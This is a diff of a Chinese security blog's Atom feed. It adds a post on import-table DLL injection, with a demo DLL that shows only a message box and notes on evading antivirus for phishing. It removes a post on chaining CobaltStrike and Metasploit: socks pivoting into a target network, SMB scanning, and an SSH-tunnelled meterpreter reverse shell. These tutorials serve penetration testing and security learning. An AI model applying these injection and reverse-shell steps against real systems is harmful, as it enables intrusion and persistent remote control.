@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://uknowsec.cn/"/>
-  <updated>2020-06-11T10:19:09.322Z</updated>
+  <updated>2020-06-12T19:06:40.838Z</updated>
   <id>https://uknowsec.cn/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>输入表注入</title>
+    <link href="https://uknowsec.cn/posts/notes/%E8%BE%93%E5%85%A5%E8%A1%A8%E6%B3%A8%E5%85%A5.html"/>
+    <id>https://uknowsec.cn/posts/notes/输入表注入.html</id>
+    <published>2020-06-12T19:17:17.000Z</published>
+    <updated>2020-06-12T19:06:40.838Z</updated>
+    
+    <content type="html"><![CDATA[<h3><span id="前言">前言</span></h3><p>​      上篇没有讲拿破轮胎大佬工具的原理，同时工具生成的DLL目前不是免杀的。所以这里讲一下工具的原理。实际上，注入工具会将输入的shellcode进行一个处理，然后将他写入到和<code>conf.inf</code>文件中，然后<code>wwwcomw.dll</code>可以看成一个shellcode加载器，这里就是分离免杀的原理。工具还帮我完成了修改输入表的步骤。然后我们只需要把<code>wwwcomw.dll</code>和<code>conf.inf</code>放置到exe运行目录即可。</p><h3><span id="输入表注入原理">输入表注入原理</span></h3><p>​      当Exe被加载时，系统会根据Exe输入表信息来加载需要用到的DLL,输入表注入的原理就是修改exe输入表，将自己的DLL添加到exe的导入表中，这样exe运行时可以将自己的DLL加载到exe的进程空间。</p><h3><span id="输入表注入">输入表注入</span></h3><p>DLL实例源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">HANDLE My_hThread = NULL;</span><br><span class="line"></span><br><span class="line">DWORD  WINAPI  ceshi(LPVOID pParameter)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(NULL, L&quot;Zero Team&quot;, L&quot;Zero team&quot;, MB_OK);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        My_hThread = ::CreateThread(NULL, 0, &amp;ceshi, 0, 0, 0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern&quot;C&quot; _declspec(dllexport) void test()</span><br><span class="line">&#123;</span><br><span class="line">    int a;</span><br><span class="line">    a = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译如上代码，得到dll文件。</p><p>使用LordPe查看输出表，可以看到我们写的test函数。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591938826964.png" alt="1591938826964"></p><p>使用Stud_PE添加输入表，导入exe查看函数。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591939030535.png" alt="1591939030535"></p><p>添加新的输入表，选择DLL，选择函数，加入清单。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591939139072.png" alt="1591939139072"></p><p>将DLL放置到exe运行目录，运行exe。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1591939196925.png" alt="1591939196925"></p><h3><span id="结语">结语</span></h3><p>​        对于该技术的研究仅限于在渗透测试或者钓鱼中的使用，所以没有太多的逆向原理知识部分。关于其他逆向原理知识和DLL处理方面，有兴趣的可以自己研究~</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;​      上篇没有讲拿破轮胎大佬工具的原理，同时工具生成的DLL目前不是免杀的。所以这里讲一下工具的原理。实际上，注入工具会将输入的shellcode进行一个处理，然后将他写入到和&lt;code&gt;conf.in
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>DLL劫持+重新制作安装包在钓鱼与反钓鱼的利用</title>
@@ -453,29 +476,6 @@
       
       
         &lt;h3&gt;&lt;span id=&quot;kerberos简介&quot;&gt;Kerberos简介&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;在Kerberos认证中，最主要的问题是如何证明“你是你”的问题，如当一个Client去访问Server服务器上的某服务时，Server如何判断Client是否有权限来访问自己主
-      
-    
-    </summary>
-    
-      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>CobaltStrike+MetaSploit 实战联动</title>
-    <link href="https://uknowsec.cn/posts/notes/CobaltStrike+MetaSploit%20%E5%AE%9E%E6%88%98%E8%81%94%E5%8A%A8.html"/>
-    <id>https://uknowsec.cn/posts/notes/CobaltStrike+MetaSploit 实战联动.html</id>
-    <published>2019-08-19T14:17:17.000Z</published>
-    <updated>2019-08-22T15:16:44.104Z</updated>
-    
-    <content type="html"><![CDATA[<h4><span id="通过beacon内置的socks功能将本地msf直接代入目标内网进行操作"><strong><strong>通过beacon内置的socks功能将本地Msf直接代入目标内网进行操作</strong></strong></span></h4><p>首先,到已控目标内网机器的beacon shell下把socks起起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">beacon&gt; socks 1080</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566202123619.png" alt="1566202123619"></p><p>接着，点开cs菜单找到 “Proxy Pivots” 复制生成的msf代理链接</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566202164641.png" alt="1566202164641"></p><p> 本地启动msf，挂着上面生成的代理链接，即可直接对目标内网进行各种探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf &gt; setg Proxies socks4:172.16.252.11:1080    意思就是让本地的msf走上面cs的socks代理</span><br><span class="line">msf &gt; setg ReverseAllowProxy true              建双向通道</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version    拿着msf中的各类探测模块对目标内网进行正常探测即可,比如,识别目标内网所有windows机器的详细系统版本,机器名和所在域</span><br><span class="line">msf &gt; set rhosts 172.17.180.0/24               指定CIDR格式的目标内网段,掩码可根据实际情况给的大一点,比如,0/20,0/16...</span><br><span class="line">msf &gt; set threads 1                            线程不易给的太大,可根据目标实际情况,控制在10以内</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566203284050.png" alt="1566203284050"></p><h4><span id="尝试借助cobaltstrike的外部tcp监听器通过ssh隧道直接派生一个meterpreter-的-shell-到本地"><strong>尝试借助CobaltStrike的外部tcp监听器通过ssh隧道直接派生一个meterpreter 的 shell 到本地</strong></span></h4><p>先在cs上创建一个tcp的外部监听器，回连端口设为8080</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566219775310.png" alt="1566219775310"></p><p>接着，到本地机器把msf起起来，并创建如下监听器</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp   注:此处的协议格式务必要和上面cs外部监听器的协议对应,不然meter是无法正常回连的</span><br><span class="line">msf &gt; set lhost 192.168.0.109</span><br><span class="line">msf &gt; set lport 8080</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566219843294.png" alt="1566219843294"></p><p>随后，回到自己的vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vi/etc/ssh/sshd_config</span><br><span class="line">  AllowTcpForwarding yes</span><br><span class="line">  GatewayPorts yes</span><br><span class="line">  TCPKeepAlive yes</span><br><span class="line">  PasswordAuthentication yes</span><br><span class="line"># systemctl restartsshd.service</span><br></pre></td></tr></table></figure><p>再次回到自己本地的linux中并通过ssh隧道做好如下转发，意思就是通过1.1.1.1 这台机器把来自外部的8080端口流量全部转到我本地192.168.3.137的8080端口上，而本地192.168.0.109的8080端口上跑的又正好是meter的监听器，所以，最终才会造成meterpreter本地上线的效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.109:8080 root@1.1.1.1 -p 22</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220724560.png" alt="1566220724560"></p><p> 隧道建立之后，习惯性的到vps上去看一眼，刚才通过隧道监听的8080端口到底有没有起来，确实起起来了才说明隧道才是通的，另外，监听的端口不能和vps机器上的现有端口冲突，否则隧道是建不成功的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># netstat -tulnp |grep &apos;8080&apos;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220672720.png" alt="1566220672720"></p><p>  最终，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，如下，当然，你也可以批量选择进行操作</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220789339.png" alt="1566220789339"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220870785.png" alt="1566220870785"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4&gt;&lt;span id=&quot;通过beacon内置的socks功能将本地msf直接代入目标内网进行操作&quot;&gt;&lt;strong&gt;&lt;strong&gt;通过beacon内置的socks功能将本地Msf直接代入目标内网进行操作&lt;/strong&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;首先,
       
     
     </summary>
